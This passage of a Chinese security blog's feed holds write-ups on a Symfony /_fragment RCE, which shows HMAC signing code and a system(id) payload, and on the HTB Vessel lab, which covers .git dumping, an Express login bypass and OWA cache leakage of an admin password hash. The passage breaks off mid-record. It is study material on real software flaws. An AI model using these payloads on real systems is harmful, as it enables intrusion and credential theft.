+<p>参考<a href="https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740">https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740</a> 写对应的service</p>
+<p>先确认能否在 <code>/etc/systemd/system</code> 下写服务，用 <code>getfacl</code> 命令确认只有写执行。然后写个service，用root身份执行就是。</p>
+<h2 id="reference">Reference：</h2>
+<ul>
+<li><a href="https://github.com/tiangolo/fastapi/issues/1788">https://github.com/tiangolo/fastapi/issues/1788</a></li>
+<li><a href="https://0xdf.gitlab.io/2023/04/15/htb-encoding.html#ssrf-in-haxtableshtb">https://0xdf.gitlab.io/2023/04/15/htb-encoding.html#ssrf-in-haxtableshtb</a></li>
+<li><a href="https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740">https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740</a></li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Symfony RCE 分析]]></title>
+        <id>https://1dayluo.github.io/post/synfony-rce-fen-xi/</id>
+        <link href="https://1dayluo.github.io/post/synfony-rce-fen-xi/">
+        </link>
+        <updated>2023-04-16T12:09:09.000Z</updated>
+        <content type="html"><![CDATA[<p>笔记与总结，笔记/参考见文末。阅读exp代码的心得忽略。</p>
+<h2 id="概括">概括</h2>
+<p>Symfony framwork为一个PHP application，并且用于许多知名CMS中，包括Drupal，Joomla!,eZPlatform,Bolt并且经常用于自定义网站。<br>
+当访问 /_fragment 的时候，构造特定payload会产生RCE。关键在于请求用HMAC进行加密，其加密密钥被存储在synfony配置下的secret值中（可被破解），其中破解方式包括：尝试默认值，离线暴力破解，简单绕过安全检查。</p>
+<blockquote>
+<p>This is mainly due to not putting enough emphasis on its importance in the documentation or installation guides.</p>
+</blockquote>
+<h2 id="版本差异">版本差异</h2>
+<ol>
+<li>
+<p><code>Symfony &lt; 4</code>: 会在请求 <code>/_fragment</code> 前，访问 <code>/_internal</code> , <code>/_proxy</code> （关联CVE：CVE-2012-6432, CVE-2014-5245,CVE-2015-4050）</p>
+</li>
+<li>
+<p><code>&gt;4</code> : 安装时会生成secret，并且 <code>/_fragment</code> 默认禁止访问。</p>
+</li>
+</ol>
+<p>漏洞挖掘两个思路：一个是注意探测同时采用weak的 <code>secret</code> 和可访问的 <code>/_fragment</code> ，另一个是通过其他已知漏洞获取 <code>secret</code> 然后访问<code>/_fragment</code></p>
+<h2 id="代码分析">代码分析</h2>
+<h3 id="漏洞产生点">漏洞产生点：</h3>
+<pre><code class="language-php"># ./vendor/symfony/http-kernel/EventListener/FragmentListener.php
+
+class FragmentListener implements EventSubscriberInterface
+{
+    public function onKernelRequest(RequestEvent $event)
+    {
+        $request = $event-&gt;getRequest();
+
+        # [1]
+        if ($this-&gt;fragmentPath !== rawurldecode($request-&gt;getPathInfo())) {
+            return;
+        }
+
+        if ($request-&gt;attributes-&gt;has('_controller')) {
+            // Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
+            $request-&gt;query-&gt;remove('_path');
+
+            return;
+        }
+
+        # [2]
+        if ($event-&gt;isMasterRequest()) {
+            $this-&gt;validateRequest($request);
+        }
+
+        # [3]
+        parse_str($request-&gt;query-&gt;get('_path', ''), $attributes);
+        $request-&gt;attributes-&gt;add($attributes);
+        $request-&gt;attributes-&gt;set('_route_params', array_replace($request-&gt;attributes-&gt;get('_route_params', []), $attributes));
+        $request-&gt;query-&gt;remove('_path');
+    }
+}
+</code></pre>
+<p>前提提要：</p>
+<ol>
+<li>
+<p><code>FragmentListener:onKernelRequest</code>会伴随每个请求运行</p>
+</li>
+<li>
+<p>一些内部变量由Symfony维护而不是用户定义，其中之一就是 <code>_controller</code> (决定Symfony来调度哪个控制器)</p>
+</li>
+<li>
+<p>开头不以 <code>_</code> 的名字是被送入控制器的参数</p>
+</li>
+</ol>
+<p>然后看上面代码，在<strong>检验请求有效性</strong>后（ <code>this-&gt;validateRequest(request); )</code> 将urldecode的 <code>_path</code> 放入 <code>$attributes</code> 变量中。</p>
+<p><code>_path</code> 举例：</p>
+<pre><code>/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&amp;_hash=...
+</code></pre>
+<p>还原后：</p>
+<pre><code>_controller=SomeClass::someMethod&amp;firstMethodParam=test1&amp;secondMethodParam=test2
+</code></pre>
+<p>这里的SomeClass::someMethod可以替换成其它命令。</p>
+<p>注意 <code>_path</code>下的 <code>_hash</code>,后续会针对该值进行验证。</p>
+<h3 id="校验请求this-validaterequest">校验请求：<code>$this-&gt;validateRequest</code></h3>
+<p>这里的 <code>$this-&gt;validateRequest</code> 会从两个方面校验 <code>$request</code> :</p>
+<ul>
+<li>
+<p>请求方式是否安全：<code>$request-&gt;isMethodSafe()</code></p>
+</li>
+<li>
+<p>请求是否签名（Signed）：<code>$this-&gt;signer-&gt;checkRequest($request)</code></p>
+</li>
+</ul>
+<p>以上二者有校验失败时，均会抛出 <code>AccessDeniedHttpException</code> 异常</p>
+<p>检查签名的涉及代码</p>
+<pre><code class="language-php">class UriSigner
+{
+    public function checkRequest(Request $request): bool
+    {
+        $qs = ($qs = $request-&gt;server-&gt;get('QUERY_STRING')) ? '?'.$qs : '';
+
+        // we cannot use $request-&gt;getUri() here as we want to work with the original URI (no query string reordering)
+        return $this-&gt;check($request-&gt;getSchemeAndHttpHost().$request-&gt;getBaseUrl().$request-&gt;getPathInfo().$qs);
+    }
+
+    /**
+     * Checks that a URI contains the correct hash.
+     *
+     * @return bool True if the URI is signed correctly, false otherwise
+     */
+    public function check(string $uri)
+    {
+        $url = parse_url($uri);
+        if (isset($url['query'])) {
+            parse_str($url['query'], $params);
+        } else {
+            $params = [];
+        }
+
+        if (empty($params[$this-&gt;parameter])) {
+            return false;
+        }
+
+        $hash = $params[$this-&gt;parameter];
+        unset($params[$this-&gt;parameter]);
+
+        # [2]
+        return hash_equals($this-&gt;computeHash($this-&gt;buildUrl($url, $params)), $hash);
+    }
+
+    private function computeHash(string $uri): string
+    {
+        # [1]
+        return base64_encode(hash_hmac('sha256', $uri, $this-&gt;secret, true));
+    }
+
+    private function buildUrl(array $url, array $params = []): string
+    {
+        ksort($params, SORT_STRING);
+        $url['query'] = http_build_query($params, '', '&amp;');
+
+        $scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
+        $host = isset($url['host']) ? $url['host'] : '';
+        $port = isset($url['port']) ? ':'.$url['port'] : '';
+        $user = isset($url['user']) ? $url['user'] : '';
+        $pass = isset($url['pass']) ? ':'.$url['pass'] : '';
+        $pass = ($user || $pass) ? &quot;$pass@&quot; : '';
+        $path = isset($url['path']) ? $url['path'] : '';
+        $query = isset($url['query']) &amp;&amp; $url['query'] ? '?'.$url['query'] : '';
+        $fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';
+
+        return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
+    }
+}
+</code></pre>
+<p>在 <code>check</code> 里，会返回字符串比较的结果( <code>hash_equal</code> ) ，而这里比较的对象为 <code>$this-&gt;computeHash</code> 的结果（传入参数为：用<code>buildUrl</code> 将传入参数后的 <code>$url</code> 重构/reconstructs输出后的结果）与 <code>$hash = params[$this-&gt;parameter];</code> 下的已有的 <code>$hash</code> 进行比较</p>
+<p>P.S 这里的URL参数为 <code>_hash</code> GET parameter</p>
+<pre><code class="language-php">return hash_equals($this-&gt;computeHash($this-&gt;buildUrl($url, $params)), $hash);
+</code></pre>
+<p>而 <code>computeHash</code> 本身是base64编码了经由 <code>hash_hmac</code>方法生成的散列值（算法sha256,密钥为 <code>$this-&gt;secret</code></p>
+<pre><code class="language-php">    private function computeHash(string $uri): string
+    {
+        # [1]
+        return base64_encode(hash_hmac('sha256', $uri, $this-&gt;secret, true));
+    }
+</code></pre>
+<p>所以正常情况下，<code>_hash</code> 对应的值的生成逻辑如下（假设这里的APP_SECRET为正确的secret）- 前提是知道secret：</p>
+<pre><code class="language-python">import base64, hmac, hashlib
+print(base64.b64encode(hmac.HMAC(b'{{APP_SECRET}}', b'http://localhost:8000/_fragment', hashlib.sha256).digest()))
+# 假设Return : b'lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm/cmFOh8='
+</code></pre>
+<p>然后访问url： <code>http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm/cmFOh8=</code> 会发现原本403的网页变为404 （ 因为没有其他指定请求属性，无法找到Controller）</p>
+<p>如果要设置 <code>system($command)</code> 则如下：</p>
+<pre><code class="language-textile"> page=&quot;http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&quot;
+</code></pre>
+<p>此时返回 <code>500</code> 并且显示代码执行成功。</p>
+<h2 id="secret">secret</h2>
+<p>secret是什么？它是一个字符串，它用于Symfony框架的一些加密和验证操作，如创建cookie或防止CSRF的令牌。秘密值应该是随机生成的，并且不应该被泄露给任何人</p>
+<p>获取secret的方式有以下几种</p>
+<ul>
+<li>
+<p>读取文件</p>
+<ul>
+<li>
+<p><code>app/config/parameters.yml</code></p>
+</li>
+<li>
+<p><code>.env</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p>phpinfo</p>
+<ul>
+<li><code>$server['APP_SECRET']</code></li>
+</ul>
+</li>
+<li>
+<p>SSRF / IP spoofing (CVE-2014-5245) ： &lt; 2.5.3, 请求来自于受信任的代理，会被认为是安全的而无需secret</p>
+</li>
+<li>
+<p>默认值/常见值: <code>ThisTokenIsNotSoSecretChangeIt</code> （更多参考<a href="https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py">symfony-exploits/secret_fragment_exploit.py at main · ambionics/symfony-exploits · GitHub</a> 下给出的一些常见secret）</p>
+</li>
+<li>
+<p>Bruteforce:</p>
+<ul>
+<li>
+<p>可行性：</p>
+<ol>
+<li>
+<p>一些人喜欢用特定密码</p>
+</li>
+<li>
+<p>secret也用于csrf加密</p>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="exp编写">exp编写</h2>
+<p>参考github上的 ：<a href="https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py">symfony-exploits/secret_fragment_exploit.py at main · ambionics/symfony-exploits · GitHub</a></p>
+<p>重要的几点：</p>
+<ol>
+<li>
+<p>HMAC计算是用的 <strong>full url</strong>, 如果服务器使用了反向代理，则需要内部URL（internel URL），并且internel可能是HTTP协议而不是HTTPS</p>
+</li>
+<li>
+<p>HMAC历史版本加密方式为SHA-1,现在是SHA-256</p>
+</li>
+</ol>
+<p>还有就是检测的方式为：无效hash访问 <code>_/fragment</code> 返回403,有效则返回500</p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li>https://www.ambionics.io/blog/symfony-secret-fragment</li>
+<li><a href="https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py">symfony-exploits/secret_fragment_exploit.py at main · ambionics/symfony-exploits · GitHub</a></li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[HTB:Vessel]]></title>
+        <id>https://1dayluo.github.io/post/htbvessel/</id>
+        <link href="https://1dayluo.github.io/post/htbvessel/">
+        </link>
+        <updated>2023-04-02T12:54:57.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="htbvessel">HTB：Vessel</h1>
+<p>关键词： .git,git information leak,express mis-handles,owa 1.7.3, CVE-2022-24637,PyInstaller generated executable file,pdfcrack</p>
+<h2 id="base-recon">Base Recon</h2>
+<p>rustscan端口扫描结果</p>
+<pre><code class="language-python">Open 10.10.11.178:53
+Open 10.10.11.178:22
+</code></pre>
+<p>用wfuzz/gobuster目录遍历（手动把一些大小写不同的重复的目录删了）</p>
+<pre><code class="language-python">000000009:   200        70 L     182 W      4213 Ch     &quot;login&quot;                                                                                   
+000000025:   200        89 L     234 W      5830 Ch     &quot;register&quot;                                                                               
+000000122:   200        51 L     125 W      2393 Ch     &quot;404&quot;                                                                                    
+000000237:   301        10 L     16 W       173 Ch      &quot;dev&quot;                                           
+000000400:   200        243 L    871 W      15030 Ch    &quot;.&quot;                                             
+000000586:   200        51 L     117 W      2335 Ch     &quot;500&quot;                                           
+000000712:   200        89 L     234 W      5830 Ch     &quot;Register&quot;                                      
+000000945:   200        52 L     120 W      2400 Ch     &quot;401&quot;                                           
+000001688:   200        63 L     177 W      3637 Ch     &quot;reset&quot;
+000004658:   403        9 L      28 W       277 Ch      &quot;server-status&quot;
+</code></pre>
+<p>子域名wfuzz貌似没什么结果（挠头.jpg)</p>
+<p>用Wappalyzer分析的技术框架 如图</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402.png" alt="20230402" loading="lazy"></figure>
+<p>以及用burpsuite的find comment查找注释</p>
+<h2 id="git">.Git</h2>
+<p>这个时候思路卡住了，看0xdf大佬的笔记发现是需要看 <code>.git</code>  ,这里可以记个笔记，除了常见得端口，子域名/目录遍历，功能点人工测试（包括api）,查找注释，技术框架历史漏洞exploit外，还可以看 <code>.git</code> ，之前在刷Pentesterlab，Blue专题得时候也刷到过（<strong>Git Information Leak II）</strong></p>
+<h3 id="手工提取">手工提取</h3>
+<p>如果网站设置禁止访问 <code>.git</code> ,那么可以访问</p>
+<ul>
+<li>.git/config</li>
+<li>.git/HEAD</li>
+</ul>
+<p>这里的对应目录是 <code>/dev/.git/config</code>  和  <code>/dev/.git/HEAD</code></p>
+<pre><code class="language-python">Request : GET /dev/.git/HEAD
+Response :ref: refs/heads/master
+
+Request: GET /dev/.git/config
+Response: 
+				[core]
+					repositoryformatversion = 0
+					filemode = true
+					bare = false
+					logallrefupdates = true
+				[user]
+					name = Ethan
+					email = ethan@vessel.htb
+				
+</code></pre>
+<p>知道head后，将HEAD换成对应的 <code>refs/heads/master</code> 得到hash：</p>
+<pre><code class="language-python">208167e785aae5b052a4a2f9843d74e733fbd917
+</code></pre>
+<p>根据所得到的hash访问:  <code>.git/objects/{{hash-前两个字母}}/{{hash后半部分}}</code> ,这里就是 <code>/dev/.git/objects/20/8167e785aae5b052a4a2f9843d74e733fbd917</code></p>
+<p>wget对应的文件，然后用file判断文件类型（一般是zlib）</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%201.png" alt="20230402" loading="lazy"></figure>
+<p>获取zlib的内容</p>
+<pre><code class="language-python">printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; |cat - 8167e785aae5b052a4a2f9843d74e733fbd917  | gzip -cd -q
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%202.png" alt="20230402" loading="lazy"></figure>
+<p>得到邮箱 <code>ethan@vessel.htb</code></p>
+<p>同时还得到新的hash</p>
+<pre><code class="language-python">6ab71e25904c53073631f4f613f88d762cc4a0e3
+edb18f3e0cd9ee39769ff3951eeb799dd1d8517e
+</code></pre>
+<p>同样的方法，分别访问</p>
+<pre><code class="language-python">http://10.10.11.178/dev/.git/objects/6a/b71e25904c53073631f4f613f88d762cc4a0e3
+http://10.10.11.178/dev/.git/objects/ed/b18f3e0cd9ee39769ff3951eeb799dd1d8517e
+</code></pre>
+<h3 id="使用工具">使用工具</h3>
+<p>因为这样的方式很繁琐，并且需要重复，工具的话一般有</p>
+<ul>
+<li>git-money</li>
+<li>GitTools</li>
+<li>DVCS-Pillage</li>
+<li>git-dumper</li>
+</ul>
+<p>这里用git-dumper （ <code>pipx install git-dumper</code>  pipx是基于pip的可以安装包到隔离环境里，且减少依赖冲突的一种包管理工具)</p>
+<p>使用git-dumper</p>
+<pre><code class="language-python">git-dumper http://10.10.11.178/dev git
+</code></pre>
+<p>提取完成后有以下目录</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%203.png" alt="20230402" loading="lazy"></figure>
+<h3 id="分析git提交记录代码">分析git提交记录/代码</h3>
+<p>查看历史commits</p>
+<pre><code class="language-python">~ git log --oneline                                                                        (exploit) 0 [17:36:28]
+208167e (HEAD -&gt; master) Potential security fixes
+edb18f3 Security Fixes
+f1369cf Initial commit
+</code></pre>
+<p>查看security fixes是什么内容</p>
+<pre><code class="language-python">git diff f1369cf edb18f3
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%204.png" alt="20230402" loading="lazy"></figure>
+<p>另外两条</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%205.png" alt="20230402" loading="lazy"></figure>
+<p>查看对应的db代码，看无password什么的</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%206.png" alt="20230402" loading="lazy"></figure>
+<p>（这里有 <code>daqvACHKvRn84VdVp</code>）</p>
+<h2 id="bypass-login">Bypass Login</h2>
+<blockquote>
+<p>Query escape functions like above are meant to fill replace the <code>?</code><br>
+ with the strings and not allow any code there such as open/close quotes or equals signs. However, Express mis-handles how different object types are passed into these function.</p>
+</blockquote>
+<h3 id="express-mis-handles">express mis-handles</h3>
+<p>这里看到代码虽然用了 <code>?</code> 来防止sql注入，</p>
+<pre><code class="language-python">connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
+</code></pre>
+<p>但是expres有一些特性会破坏原本的sql语句，例如</p>
+<pre><code class="language-python">{
+    &quot;username&quot;: &quot;admin&quot;,
+    &quot;password&quot;: {
+        &quot;password&quot;: 1,
+    }
+}
+</code></pre>
+<p>就会变成</p>
+<pre><code class="language-python">SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1;
+</code></pre>
+<p>按照这个思路发起请求（这里如果不是 <code>application/json</code> 而是 <code>application/x-www-form-urlencoded</code> 其实也可以，用password[password]=1 就可以</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%207.png" alt="20230402" loading="lazy"></figure>
+<p>最后进入管理员面板（好耶）</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%208.png" alt="20230402" loading="lazy"></figure>
+<p>点击如图的Analytics功能发现会进入 <a href="http://openwebanalytics.vessel.htb/"><code>http://openwebanalytics.vessel.htb/</code></a> 里，添加到 <code>/ect/hosts</code> 里</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%209.png" alt="20230402" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2010.png" alt="20230402" loading="lazy"></figure>
+<h2 id="open-web-analytics">Open Web Analytics</h2>
+<p>只有找会密码。试了刚刚git泄漏的用户 <code>ethan@vessel.htb</code> 没有什么结果（提示Error，没有对应邮箱），看index.php会处理两个参数,分别是 <code>owa_do</code>和 <code>owa_go</code> ，分别代表着当前操作和跳转</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2011.png" alt="20230402" loading="lazy"></figure>
+<p>在源代码中看出当前version的版本是 1.7.3</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2012.png" alt="20230402" loading="lazy"></figure>
+<p>搜索关键词+exploit发现有漏洞 <code>CVE-2022-24637</code>  （参考文章：<a href="https://devel0pment.de/?p=2494">https://devel0pment.de/?p=2494</a>）</p>
+<h3 id="缓存机制的利用">缓存机制的利用</h3>
+<p>漏洞的关键是存在一个缓存机制，并且缓存自动将base64编码后得comments和header，footer拼接，并放在了单引号里。在单双引号escape sequences存在巨大的区别（截图来自刚刚那篇文章）：</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2013.png" alt="20230402" loading="lazy"></figure>
+<p>单引号不会转义特殊字符，例如 <code>\n</code> ，这样就可以破坏php代码的格式，从而不按照php代码解析导致信息泄漏。而owa（open web analytics）的缓存机制是在目录 <strong><code>/owa-data/caches/</code></strong> 下，即使用户没登录，也可以伪造登录创造缓存。刚刚试过了用户 <code>ethan@vessel.htb</code>  这次将用户名换为admin，创造缓存，然后访问对应cache目录，然而当我们访问目录时，</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2014.png" alt="20230402" loading="lazy"></figure>
+<p>却是空白。</p>
+<blockquote>
+<p>However, immediately after a failed login, it returns an empty page. The cache seems to clear this directory periodically.</p>
+</blockquote>
+<p>看起来这个方法行不通。但是在那篇讲解 <code>CVE-2022-24637</code>  的文章里还提到了，文件名是可预测的。我们从这个点出发，尝试探索（这里偷了个懒，我没有去下载历史版本，本地进行代码分析，而是选择阅读0xdf的文章+github的历史版本仓库链接进行代码分析）。阅读<a href="https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L141-L148">源代码</a>可以看到文件名是由变量 <code>$collection_dir</code> 拼接而成的</p>
+<pre><code class="language-php">function putItemToCacheStore($collection, $id) {
+....
+$collection_dir = $this-&gt;makeCollectionDirPath($collection);
+$cache_file = $collection_dir.$id.'.php';
+....
+}
+</code></pre>
+<p>这里 <code>putItemToCacheStore</code> 函数被 <code>cache.php</code> 内的 <code>persistCache</code> 而调用。cache_file由两个变量组成</p>
+<ul>
+<li><code>$collection_dir</code></li>
+<li><code>$id</code></li>
+</ul>
+<p>然后看函数  <code>$this-&gt;makeCollectionDirPath</code> 这里看到</p>
+<ul>
+<li><code>$collection_dir</code> 为  <code>owa-data/caches</code></li>
+<li><code>cache_id</code> 为 <code>1</code></li>
+<li><code>$collection</code> 为目录，例如 <code>owa_user</code>, <code>owa_site</code><br>
+,</li>
+</ul>
+<pre><code class="language-php">function makeCollectionDirPath($collection) {
+
+        if (!in_array($collection, $this-&gt;global_collections)) {
+            return $this-&gt;cache_dir.$this-&gt;cache_id.'/'.$collection.'/';
+
+        } else {
+            return $this-&gt;cache_dir.$collection.'/';
+// owa-data/caches/1
+        }
+    }
+</code></pre>
+<p>查看调用 <code>putItemToCacheStore</code> 的函数 <code>persistCache</code> 关于 <code>$id</code> 的定义</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2015.png" alt="20230402" loading="lazy"></figure>
+<p>而 <code>$this-&gt;dirty_objs</code> 在函数 <code>set</code> （cache.php） 里被定义</p>
+<pre><code class="language-php">$hkey = $this-&gt;hash($key); // 计算md5
+$this-&gt;dirty_objs[$collection][$hkey] = $hkey;
+</code></pre>
+<p>调用函数set的函数代码</p>
+<pre><code class="language-php">function addToCache($col = 'id') {
+        
+        if($this-&gt;isCachable()) {
+            $cache = owa_coreAPI::cacheSingleton();
+            $cache-&gt;setCollectionExpirationPeriod($this-&gt;getTableName(), $this-&gt;getCacheExpirationPeriod());
+            $cache-&gt;set($this-&gt;getTableName(), $col.$this-&gt;get('id'), $this, $this-&gt;getCacheExpirationPeriod());
+        }
+    }
+</code></pre>
+<p>调用addToCache的函数</p>
+<pre><code class="language-php">function getByColumn($col, $value) {
+...[snip]...
+        } else {
+        
+            $db = owa_coreAPI::dbSingleton();
+            $db-&gt;selectFrom($this-&gt;getTableName());
+            $db-&gt;selectColumn('*');
+            owa_coreAPI::debug(&quot;Col: $col, value: $value&quot;);    
+            $db-&gt;where($col, $value);
+            $properties = $db-&gt;getOneRow();
+            
+            if (!empty($properties)) {
+                
+                $this-&gt;setProperties($properties);
+                $this-&gt;wasPersisted = true;
+                // add to cache            
+                $this-&gt;addToCache($col);
+                owa_coreAPI::debug('entity loaded from db');        
+            }
+</code></pre>
+<p>有多处调用该函数，但是有一处是用户操作有关，给定了 <code>user_id</code>：</p>
+<pre><code class="language-php">function getUser() {
+
+        // fetch user object from the db
+        $this-&gt;u = owa_coreAPI::entityFactory('base.user');
+        $this-&gt;u-&gt;getByColumn('user_id', $this-&gt;credentials['user_id']);
+    }
+</code></pre>
+<p>所以例如GetUser对应得是 <code>user_id1</code>  （转为md5 ： <code>c30da9265ba0a4704db9229f864c9eb7</code> ）</p>
+<p>然后根据以上分析的，访问 cache_file</p>
+<pre><code class="language-php">http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2016.png" alt="20230402" loading="lazy"></figure>
+<p>base64 decode</p>
+<pre><code class="language-php">O:8:&quot;owa_user&quot;:5:{s:4:&quot;name&quot;;s:9:&quot;base.user&quot;;s:10:&quot;properties&quot;;a:10:{s:2:&quot;id&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:1:&quot;1&quot;;s:9:&quot;data_type&quot;;s:6:&quot;SERIAL&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:7:&quot;user_id&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:5:&quot;admin&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:1;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:8:&quot;password&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:60:&quot;$2y$10$yjH5xlwtXG9VoB66ridzt.x9iL9jvBfeHByOXtmUQqDU9an7hyscy&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:4:&quot;role&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:5:&quot;admin&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:9:&quot;real_name&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:13:&quot;default admin&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:13:&quot;email_address&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:16:&quot;admin@vessel.htb&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:12:&quot;temp_passkey&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:32:&quot;ac9e4437ca5150340fdd0578d70a4211&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:13:&quot;creation_date&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:10:&quot;1650211659&quot;;s:9:&quot;data_type&quot;;s:6:&quot;BIGINT&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:16:&quot;last